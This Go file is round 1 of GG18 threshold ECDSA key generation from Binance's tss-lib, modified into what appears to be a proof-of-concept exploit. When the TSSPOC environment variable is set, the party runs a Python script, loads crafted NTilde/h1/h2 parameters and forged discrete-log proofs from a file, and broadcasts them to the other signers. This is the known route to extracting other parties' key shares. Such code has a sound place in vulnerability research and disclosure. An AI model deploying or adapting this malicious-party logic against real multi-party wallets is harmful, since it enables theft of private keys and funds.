// Copyright © 2019 Binance
//
// This file is part of Binance. The full Binance copyright notice, including
// terms governing use, modification, and redistribution, is contained in the
// file LICENSE at the root of the source code distribution tree.

package keygen

import (
	"errors"
	"fmt"
	"log"
	"math/big"
	"os"
	"os/exec"

	"github.com/binance-chain/tss-lib/common"
	"github.com/binance-chain/tss-lib/crypto"
	cmts "github.com/binance-chain/tss-lib/crypto/commitments"
	"github.com/binance-chain/tss-lib/crypto/dlnp"
	"github.com/binance-chain/tss-lib/crypto/vss"
	"github.com/binance-chain/tss-lib/tss"
)

var (
	zero = big.NewInt(0)
)

func init() {
	fmt.Println("TSSPOC")
}

// round 1 represents round 1 of the keygen part of the GG18 ECDSA TSS spec (Gennaro, Goldfeder; 2018)
func newRound1(params *tss.Parameters, save *LocalPartySaveData, temp *localTempData, out chan<- tss.Message, end chan<- LocalPartySaveData) tss.Round {
	return &round1{
		&base{params, save, temp, out, end, make([]bool, len(params.Parties().IDs())), false, 1}}
}

func genMaliciousParams() (p, h1, h2 *big.Int,
	proofDlogH2BaseH1, proofDlogH1BaseH2 *dlnp.Proof) {

	const PathMaliciousParams = "malicious_params.txt"
	const PathScriptGenerateParams = "verichains/scripts/gen_params.py"
	if _, err := os.Stat(PathMaliciousParams); errors.Is(err, os.ErrNotExist) {
		cmd := exec.Command("python", PathScriptGenerateParams)
		cmd.Stdout, err = os.OpenFile(PathMaliciousParams, os.O_CREATE|os.O_WRONLY, 0666)
		if err != nil {
			log.Fatal(err)
		}
		if err := cmd.Run(); err != nil {
			log.Fatal(err)
		}
	}

	f, err := os.Open(PathMaliciousParams)
	if err != nil {
		log.Fatal(err)
	}
	ints := make([]*big.Int, 3+128*4)
	for i := 0; i < len(ints); i++ {
		ints[i] = new(big.Int)
		if _, err := fmt.Fscan(f, ints[i]); err != nil {
			log.Fatal(err)
		}
	}

	p = ints[0]
	h1 = ints[1]
	h2 = ints[2]
	proofDlogH2BaseH1 = new(dlnp.Proof)
	proofDlogH1BaseH2 = new(dlnp.Proof)
	for i := 0; i < 128; i++ {
		proofDlogH2BaseH1.Alpha[i] = ints[3+128*0+i]
		proofDlogH2BaseH1.T[i] = ints[3+128*1+i]
		proofDlogH1BaseH2.Alpha[i] = ints[3+128*2+i]
		proofDlogH1BaseH2.T[i] = ints[3+128*3+i]
	}
	return
}

func (round *round1) Start() *tss.Error {
	if round.started {
		return round.WrapError(errors.New("round already started"))
	}
	round.number = 1
	round.started = true
	round.resetOK()

	Pi := round.PartyID()
	i := Pi.Index

	// 1. calculate "partial" key share ui
	ui := common.GetRandomPositiveInt(tss.EC().Params().N)

	round.temp.ui = ui

	// 2. compute the vss shares
	ids := round.Parties().IDs().Keys()
	vs, shares, err := vss.Create(round.Threshold(), ui, ids)
	if err != nil {
		return round.WrapError(err, Pi)
	}
	round.save.Ks = ids

	// security: the original u_i may be discarded
	ui = zero // clears the secret data from memory
	_ = ui    // silences a linter warning

	// make commitment -> (C, D)
	pGFlat, err := crypto.FlattenECPoints(vs)
	if err != nil {
		return round.WrapError(err, Pi)
	}
	cmt := cmts.NewHashCommitment(pGFlat...)

	// 4. generate Paillier public key E_i, private key and proof
	// 5-7. generate safe primes for ZKPs used later on
	// 9-11. compute ntilde, h1, h2 (uses safe primes)
	// use the pre-params if they were provided to the LocalParty constructor
	var preParams *LocalPreParams
	if round.save.LocalPreParams.Validate() && !round.save.LocalPreParams.ValidateWithProof() {
		return round.WrapError(
			errors.New("`optionalPreParams` failed to validate; it might have been generated with an older version of tss-lib"))
	} else if round.save.LocalPreParams.ValidateWithProof() {
		preParams = &round.save.LocalPreParams
	} else {
		preParams, err = GeneratePreParams(round.SafePrimeGenTimeout(), 3)
		if err != nil {
			return round.WrapError(errors.New("pre-params generation failed"), Pi)
		}
	}
	var dlnProof1, dlnProof2 *dlnp.Proof
	if os.Getenv("TSSPOC") != "" {
		// load malicious params
		fmt.Printf("Generating malicious params for party: %s...\n", round.PartyID().Moniker)
		preParams.NTildei, preParams.H1i, preParams.H2i, dlnProof1, dlnProof2 = genMaliciousParams()
	} else {
		// generate the dlnproofs for keygen
		h1i, h2i, alpha, beta, p, q, NTildei :=
			preParams.H1i,
			preParams.H2i,
			preParams.Alpha,
			preParams.Beta,
			preParams.P,
			preParams.Q,
			preParams.NTildei
		dlnProof1 = dlnp.NewProof(h1i, h2i, alpha, p, q, NTildei)
		dlnProof2 = dlnp.NewProof(h2i, h1i, beta, p, q, NTildei)
	}
	round.save.LocalPreParams = *preParams
	round.save.NTildej[i] = preParams.NTildei
	round.save.H1j[i], round.save.H2j[i] = preParams.H1i, preParams.H2i

	// for this P: SAVE
	// - shareID
	// and keep in temporary storage:
	// - VSS Vs
	// - our set of Shamir shares
	round.save.ShareID = ids[i]
	round.temp.vs = vs
	round.temp.shares = shares

	// for this P: SAVE de-commitments, paillier keys for round 2
	round.save.PaillierSK = preParams.PaillierSK
	round.save.PaillierPKs[i] = &preParams.PaillierSK.PublicKey
	round.temp.deCommitPolyG = cmt.D

	// BROADCAST commitments, paillier pk + proof; round 1 message
	{
		msg, err := NewKGRound1Message(
			round.PartyID(), cmt.C, &preParams.PaillierSK.PublicKey, preParams.NTildei, preParams.H1i, preParams.H2i, dlnProof1, dlnProof2)
		if err != nil {
			return round.WrapError(err, Pi)
		}
		round.temp.kgRound1Messages[i] = msg
		round.out <- msg
	}
	return nil
}

func (round *round1) CanAccept(msg tss.ParsedMessage) bool {
	if _, ok := msg.Content().(*KGRound1Message); ok {
		return msg.IsBroadcast()
	}
	return false
}

func (round *round1) Update() (bool, *tss.Error) {
	for j, msg := range round.temp.kgRound1Messages {
		if round.ok[j] {
			continue
		}
		if msg == nil || !round.CanAccept(msg) {
			return false, nil
		}
		// vss check is in round 2
		round.ok[j] = true
	}
	return true, nil
}

func (round *round1) NextRound() tss.Round {
	round.started = false
	return &round2{round}
}
